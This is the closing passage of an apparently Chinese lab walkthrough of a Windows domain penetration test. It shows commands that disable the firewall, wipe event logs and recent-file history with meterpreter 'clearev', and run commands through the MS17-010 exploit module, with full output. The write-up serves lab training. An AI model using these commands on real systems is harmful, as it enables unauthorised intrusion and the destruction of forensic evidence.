netsh advfirewall set allprofiles state off			# Windows Server 2003 之后系统版本</p></blockquote> <p>剩下略，参考&quot;远程登陆-启用远程桌面-MSF部分&quot;</p> <p>**域控渗透方法域上述基本一致，<s>省略</s> **</p> <p>需要注意的是，域控通过策略组禁用了远程桌面，方法会有点不一样。</p> <p>当然，不建议进行以下操作，毕竟在实际环境中并碰不到域控。</p> <blockquote><p>计算机配置 —&gt; 管理模板 —&gt; Windows组件 —&gt; 远程桌面服务 —&gt; 远程桌面会话主机 —&gt; 连接，允许用户通过使用远程桌面服务进行远程连接</p></blockquote> <p><img src="/assets/img/image-20220815174304021.bbf1a766.png" alt="image-20220815174304021"></p> <h2 id="清除痕迹"><a href="#清除痕迹" class="header-anchor">#</a> 清除痕迹</h2> <p><strong>清除日志</strong></p> <blockquote><p>meterperter自带清除日志功能： clearev     				# 可清除windows中的应用程序日志、系统日志、安全日志</p></blockquote> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>msf6 auxiliary<span class="token punctuation">(</span>admin/smb/ms17_010_command<span class="token punctuation">)</span> <span class="token operator">&gt;</span> sessions 

Active sessions
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

  Id  Name  Type                     Information               Connection
  --  ----  ----                     -----------               ----------
  <span class="token number">1</span>         meterpreter x64/windows  GOD<span class="token punctuation">\</span>Administrator @ STU1  <span class="token number">192.168</span>.220.137:9999 -<span class="token operator">&gt;</span> <span class="token number">192.168</span>.220.138:7465  <span class="token punctuation">(</span><span class="token number">192.168</span>.220.138<span class="token punctuation">)</span>

msf6 auxiliary<span class="token punctuation">(</span>admin/smb/ms17_010_command<span class="token punctuation">)</span> <span class="token operator">&gt;</span> sessions <span class="token number">1</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting interaction with <span class="token number">1</span><span class="token punctuation">..</span>.

meterpreter <span class="token operator">&gt;</span> clearev
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Wiping <span class="token number">1756</span> records from Application<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Wiping <span class="token number">5230</span> records from System<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Wiping <span class="token number">1842</span> records from Security<span class="token punctuation">..</span>.
meterpreter <span class="token operator">&gt;</span> shell
Process <span class="token number">2000</span> created.
Channel <span class="token number">11</span> created.
Microsoft Windows <span class="token punctuation">[</span>�汾 <span class="token number">6.1</span>.7601<span class="token punctuation">]</span>
��Ȩ���� <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2009</span> Microsoft Corporation����������Ȩ����

c:<span class="token punctuation">\</span><span class="token operator">&gt;</span>del /f /s /q “%userprofile%<span class="token punctuation">\</span>Recent*.*
del /f /s /q ��?userprofile%<span class="token punctuation">\</span>Recent*.*
�ļ�����Ŀ¼���������﷨����ȷ��

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br></div></div><p><strong>清除历史</strong>：<code>del /f /s /q “%userprofile%\Recent*.*</code></p> <p>*：就是要清除 <code>C:\Users\[userName]\Recent</code> 里的所有内容</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>msf6 auxiliary(admin/smb/ms17_010_command) &gt; set command del /f /s /q “%userprofile%\Recent*.*
command =&gt; del /f /s /q “%userprofile%Recent*.*
msf6 auxiliary(admin/smb/ms17_010_command) &gt; run

[*] 192.168.52.141:445    - Target OS: Windows Server 2003 3790
[*] 192.168.52.141:445    - Filling barrel with fish... done
[*] 192.168.52.141:445    - &lt;---------------- | Entering Danger Zone | ----------------&gt;
[*] 192.168.52.141:445    -     [*] Preparing dynamite...
[*] 192.168.52.141:445    -             Trying stick 1 (x64)...Miss
[*] 192.168.52.141:445    -             [*] Trying stick 2 (x86)...Boom!
[*] 192.168.52.141:445    -     [+] Successfully Leaked Transaction!
[*] 192.168.52.141:445    -     [+] Successfully caught Fish-in-a-barrel
[*] 192.168.52.141:445    - &lt;---------------- | Leaving Danger Zone | ----------------&gt;
[*] 192.168.52.141:445    - Reading from CONNECTION struct at: 0x87d12d60
[*] 192.168.52.141:445    - Built a write-what-where primitive...
[+] 192.168.52.141:445    - Overwrite complete... SYSTEM session obtained!
[+] 192.168.52.141:445    - Service start timed out, OK if running a command or non-service executable...
[*] 192.168.52.141:445    - Getting the command output...
[*] 192.168.52.141:445    - Command finished with no output
[*] 192.168.52.141:445    - Executing cleanup...
[+] 192.168.52.141:445    - Cleanup was successful
[+] 192.168.52.141:445    - Command completed successfully!
[*] 192.168.52.141:445    - Output for &quot;del /f /s /q “%userprofile%Recent*.*&quot;:



[*] 192.168.52.141:445    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br></div></div><h2 id="常见问题"><a href="#常见问题" class="header-anchor">#</a> 常见问题</h2> <p><strong>端口占用</strong></p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run

<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Handler failed to <span class="token builtin class-name">bind</span> to <span class="token number">192.168</span>.220.137:9999:-  -
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Handler failed to <span class="token builtin class-name">bind</span> to <span class="token number">0.0</span>.0.0:9999:-  -
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Exploit failed <span class="token punctuation">[</span>bad-config<span class="token punctuation">]</span>: Rex::BindFailed The address is already <span class="token keyword">in</span> use or unavailable: <span class="token punctuation">(</span><span class="token number">0.0</span>.0.0:9999<span class="token punctuation">)</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Exploit completed, but no session was created.
msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> sessions i

Active sessions
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

No active sessions.
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>解决：</p> <blockquote><p>netstat -tulpen</p> <p>fuser -k 9999/tcp</p></blockquote> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token function">netstat</span> -tulpen
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> exec: <span class="token function">netstat</span> -tulpen

Active Internet connections <span class="token punctuation">(</span>only servers<span class="token punctuation">)</span>
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name    
tcp6       <span class="token number">0</span>      <span class="token number">0</span> :::50050                :::*                    LISTEN      <span class="token number">0</span>          <span class="token number">221354</span>     <span class="token number">74832</span>/java          
tcp6       <span class="token number">0</span>      <span class="token number">0</span> :::9999                 :::*                    LISTEN      <span class="token number">0</span>          <span class="token number">221355</span>     <span class="token number">74832</span>/java          
tcp6       <span class="token number">0</span>      <span class="token number">0</span> :::80                   :::*                    LISTEN      <span class="token number">0</span>          <span class="token number">221356</span>     <span class="token number">74832</span>/java          
msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token function">fuser</span> -k <span class="token number">9999</span>/tcp
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> exec: <span class="token function">fuser</span> -k <span class="token number">9999</span>/tcp

<span class="token number">9999</span>/tcp:            <span class="token number">74832</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div></div></section> <footer class="page-edit"><!----> <div class="last-updated"><span class="prefix">Last Updated: </span> <span class="time">2023/1/4 12:15:00</span></div></footer> <!----> <div class="comments-wrapper"><!----></div> <ul class="side-bar sub-sidebar-wrapper" style="width:12rem;" data-v-cb1513f6><li class="level-2" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st1.html#环境搭建" class="sidebar-link reco-side-环境搭建" data-v-cb1513f6>环境搭建</a></li><li class="level-2" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st1.html#信息收集" class="sidebar-link reco-side-信息收集" data-v-cb1513f6>信息收集</a></li><li class="level-3" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st1.html#目录扫描" class="sidebar-link reco-side-目录扫描" data-v-cb1513f6>目录扫描</a></li><li class="level-2" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st1.html#指纹识别" class="sidebar-link reco-side-指纹识别" data-v-cb1513f6>指纹识别</a></li><li class="level-3" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st1.html#whatweb" class="sidebar-link reco-side-whatweb" data-v-cb1513f6>Whatweb</a></li><li class="level-3" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st1.html#御剑web指纹识别-大禹cms系统识别" class="sidebar-link reco-side-御剑web指纹识别-大禹cms系统识别" data-v-cb1513f6>御剑Web指纹识别/大禹CMS系统识别</a></li><li class="level-2" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st1.html#漏洞分析" class="sidebar-link reco-side-漏洞分析" data-v-cb1513f6>漏洞分析</a></li><li class="level-2" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st1.html#渗透攻击" class="sidebar-link reco-side-渗透攻击" data-v-cb1513f6>渗透攻击</a></li><li class="level-3" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st1.html#制作并上传木马" class="sidebar-link reco-side-制作并上传木马" data-v-cb1513f6>制作并上传木马</a></li><li class="level-2" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st1.html#内网渗透" class="sidebar-link reco-side-内网渗透" data-v-cb1513f6>内网渗透</a></li><li class="level-3" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st1.html#arp扫内网主机" class="sidebar-link reco-side-arp扫内网主机" data-v-cb1513f6>ARP扫内网主机</a></li><li class="level-3" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st1.html#判断域控" class="sidebar-link reco-side-判断域控" data-v-cb1513f6>判断域控</a></li><li class="level-3" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st1.html#msf起代理-nmap失败" class="sidebar-link reco-side-msf起代理-nmap失败" data-v-cb1513f6>msf起代理 (nmap失败)</a></li><li class="level-2" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st1.html#权限提升" class="sidebar-link reco-side-权限提升" data-v-cb1513f6>权限提升</a></li><li class="level-3" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st1.html#法一-msf" class="sidebar-link reco-side-法一-msf" data-v-cb1513f6>法一：MSF</a></li><li class="level-3" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st1.html#法二-使用cs模块-含渗透" class="sidebar-link reco-side-法二-使用cs模块-含渗透" data-v-cb1513f6>法二：使用CS模块 (含渗透)</a></li><li class="level-2" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st1.html#远程登陆" class="sidebar-link reco-side-远程登陆" data-v-cb1513f6>远程登陆</a></li><li class="level-3" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st1.html#获取密码" class="sidebar-link reco-side-获取密码" data-v-cb1513f6>获取密码</a></li><li class="level-3" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st1.html#启用远程桌面" class="sidebar-link reco-side-启用远程桌面" data-v-cb1513f6>启用远程桌面</a></li><li class="level-2" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st1.html#权限维持" class="sidebar-link reco-side-权限维持" data-v-cb1513f6>权限维持</a></li><li class="level-3" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st1.html#guest后门" class="sidebar-link reco-side-guest后门" data-v-cb1513f6>Guest后门</a></li><li class="level-3" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st1.html#添加新用户后门" class="sidebar-link reco-side-添加新用户后门" data-v-cb1513f6>添加新用户后门</a></li><li class="level-3" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st1.html#尴尬之处" class="sidebar-link reco-side-尴尬之处" data-v-cb1513f6>尴尬之处</a></li><li class="level-2" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st1.html#横向探测" class="sidebar-link reco-side-横向探测" data-v-cb1513f6>横向探测</a></li><li class="level-3" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st1.html#法一-msf-这里也写了proxychains" class="sidebar-link reco-side-法一-msf-这里也写了proxychains" data-v-cb1513f6>法一：MSF (*这里也写了ProxyChains)</a></li><li class="level-3" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st1.html#法二-cs-2" class="sidebar-link reco-side-法二-cs-2" data-v-cb1513f6>法二：CS</a></li><li class="level-2" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st1.html#横向移动" class="sidebar-link reco-side-横向移动" data-v-cb1513f6>横向移动</a></li><li class="level-2" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st1.html#清除痕迹" class="sidebar-link reco-side-清除痕迹" data-v-cb1513f6>清除痕迹</a></li><li class="level-2" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st1.html#常见问题" class="sidebar-link reco-side-常见问题" data-v-cb1513f6>常见问题</a></li></ul></main> <!----></div></div></div></div><div class="global-ui"><div class="back-to-ceiling" style="right:1rem;bottom:6rem;width:2.5rem;height:2.5rem;border-radius:.25rem;line-height:2.5rem;display:none;" data-v-c6073ba8 data-v-c6073ba8><svg t="1574745035067" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="5404" class="icon" data-v-c6073ba8><path d="M526.60727968 10.90185116a27.675 27.675 0 0 0-29.21455937 0c-131.36607665 82.28402758-218.69155461 228.01873535-218.69155402 394.07834331a462.20625001 462.20625001 0 0 0 5.36959153 69.94390903c1.00431239 6.55289093-0.34802892 13.13561351-3.76865779 18.80351572-32.63518765 54.11355614-51.75690182 118.55860487-51.7569018 187.94566865a371.06718723 371.06718723 0 0 0 11.50484808 91.98906777c6.53300375 25.50556257 41.68394495 28.14064038 52.69160883 4.22606766 17.37162448-37.73630017 42.14135425-72.50938081 72.80769204-103.21549295 2.18761121 3.04276886 4.15646224 6.24463696 6.40373557 9.22774369a1871.4375 1871.4375 0 0 0 140.04691725 5.34970492 1866.36093723 1866.36093723 0 0 0 140.04691723-5.34970492c2.24727335-2.98310674 4.21612437-6.18497483 6.3937923-9.2178004 30.66633723 30.70611158 55.4360664 65.4791928 72.80769147 103.21549355 11.00766384 23.91457269 46.15860503 21.27949489 52.69160879-4.22606768a371.15156223 371.15156223 0 0 0 11.514792-91.99901164c0-69.36717486-19.13165746-133.82216804-51.75690182-187.92578088-3.42062944-5.66790279-4.76302748-12.26056868-3.76865837-18.80351632a462.20625001 462.20625001 0 0 0 5.36959269-69.943909c-0.00994388-166.08943902-87.32547796-311.81420293-218.6915546-394.09823051zM605.93803103 357.87693858a93.93749974 93.93749974 0 1 1-187.89594924 6.1e-7 93.93749974 93.93749974 0 0 1 187.89594924-6.1e-7z" p-id="5405" data-v-c6073ba8></path><path d="M429.50777625 765.63860547C429.50777625 803.39355007 466.44236686 1000.39046097 512.00932183 1000.39046097c45.56695499 0 82.4922232-197.00623328 82.5015456-234.7518555 0-37.75494459-36.9345906-68.35043303-82.4922232-68.34111062-45.57627738-0.00932239-82.52019037 30.59548842-82.51086798 68.34111062z" p-id="5406" data-v-c6073ba8></path></svg></div></div></div>
    <script src="/assets/js/app.46813ee6.js" defer></script><script src="/assets/js/6.9798be95.js" defer></script><script src="/assets/js/1.dc08dc78.js" defer></script><script src="/assets/js/3.c1c2a038.js" defer></script>
  </body>
</html>
